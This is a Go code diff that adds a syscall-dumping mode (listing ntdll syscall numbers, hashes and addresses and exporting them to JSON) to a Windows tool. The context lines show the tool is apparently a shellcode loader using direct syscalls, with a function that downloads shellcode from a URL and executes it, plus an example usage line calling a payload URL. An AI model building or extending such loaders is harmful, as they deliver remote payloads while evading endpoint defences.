@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io"
@@ -10,6 +11,7 @@ import (
 	"sort"
 	"strconv"
 	"strings"
+	"time"
 	"unsafe"
 
 	winapi "github.com/carved4/go-direct-syscall"
@@ -41,6 +43,21 @@ const (
 type ProcessInfo struct {
 	Pid  uint32
 	Name string
+}
+
+// SyscallDumpResult represents the complete syscall dump for JSON export
+type SyscallDumpResult struct {
+	Timestamp   string                     `json:"timestamp"`
+	SystemInfo  SystemInfo                 `json:"system_info"`
+	Syscalls    []winapi.SyscallInfo       `json:"syscalls"`
+	TotalCount  int                        `json:"total_count"`
+}
+
+// SystemInfo holds basic system information for the dump
+type SystemInfo struct {
+	OS           string `json:"os"`
+	Architecture string `json:"architecture"`
+	NtdllBase    string `json:"ntdll_base"`
 }
 
 // downloadPayload downloads shellcode from a URL
@@ -250,7 +267,79 @@ func main() {
 	// Parse command line flags
 	urlFlag := flag.String("url", "", "URL to download shellcode from")
 	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode")
+	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")
 	flag.Parse()
+
+	// Check if dump flag is used
+	if *dumpFlag {
+		fmt.Println("Dumping all available syscalls from ntdll.dll...")
+		fmt.Println("=" + strings.Repeat("=", 79))
+		
+		syscalls, err := winapi.DumpAllSyscalls()
+		if err != nil {
+			fmt.Printf("Failed to dump syscalls: %v\n", err)
+			os.Exit(1)
+		}
+		
+		// Sort syscalls by syscall number for better readability
+		sort.Slice(syscalls, func(i, j int) bool {
+			return syscalls[i].SyscallNumber < syscalls[j].SyscallNumber
+		})
+		
+		// Display to console
+		fmt.Printf("Found %d syscall functions:\n\n", len(syscalls))
+		fmt.Printf("%-4s %-40s %-12s %-16s\n", "SSN", "Function Name", "Hash", "Address")
+		fmt.Printf("%-4s %-40s %-12s %-16s\n", strings.Repeat("-", 4), strings.Repeat("-", 40), strings.Repeat("-", 12), strings.Repeat("-", 16))
+		
+		for _, sc := range syscalls {
+			fmt.Printf("%-4d %-40s 0x%-10X 0x%-14X\n", 
+				sc.SyscallNumber, sc.Name, sc.Hash, sc.Address)
+		}
+		
+		fmt.Printf("\nTotal syscalls found: %d\n", len(syscalls))
+		
+		// Prepare data for JSON export
+		ntdllBase := "0x0"
+		if len(syscalls) > 0 {
+			// Calculate ntdll base from first syscall address (rough estimate)
+			firstAddr := syscalls[0].Address
+			// Round down to nearest 64KB boundary (typical DLL alignment)
+			baseAddr := firstAddr &^ 0xFFFF
+			ntdllBase = fmt.Sprintf("0x%X", baseAddr)
+		}
+		
+		dumpResult := SyscallDumpResult{
+			Timestamp: time.Now().Format("2006-01-02T15:04:05Z07:00"),
+			SystemInfo: SystemInfo{
+				OS:           "Windows",
+				Architecture: "x64",
+				NtdllBase:    ntdllBase,
+			},
+			Syscalls:   syscalls,
+			TotalCount: len(syscalls),
+		}
+		
+		// Generate filename with timestamp
+		filename := fmt.Sprintf("syscall_dump_%s.json", time.Now().Format("20060102_150405"))
+		
+		// Marshal to JSON with proper indentation
+		jsonData, err := json.MarshalIndent(dumpResult, "", "  ")
+		if err != nil {
+			fmt.Printf("Failed to marshal JSON: %v\n", err)
+			os.Exit(1)
+		}
+		
+		// Write to file
+		err = os.WriteFile(filename, jsonData, 0644)
+		if err != nil {
+			fmt.Printf("Failed to write JSON file: %v\n", err)
+			os.Exit(1)
+		}
+		
+		fmt.Printf("\n✓ Syscall dump saved to: %s\n", filename)
+		fmt.Printf("✓ File size: %.2f KB\n", float64(len(jsonData))/1024)
+		return
+	}
 
 	var payload []byte
 	var err error
@@ -264,10 +353,11 @@ func main() {
 		// Check if URL is provided
 		url := *urlFlag
 		if url == "" {
-			fmt.Println("Error: You must specify either -url or -example flag")
+			fmt.Println("Error: You must specify either -url, -example, or -dump flag")
 			fmt.Println("Usage:")
 			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin")
 			fmt.Println("  ./cmd.exe -example")
+			fmt.Println("  ./cmd.exe -dump")
 			os.Exit(1)
 		}
 		
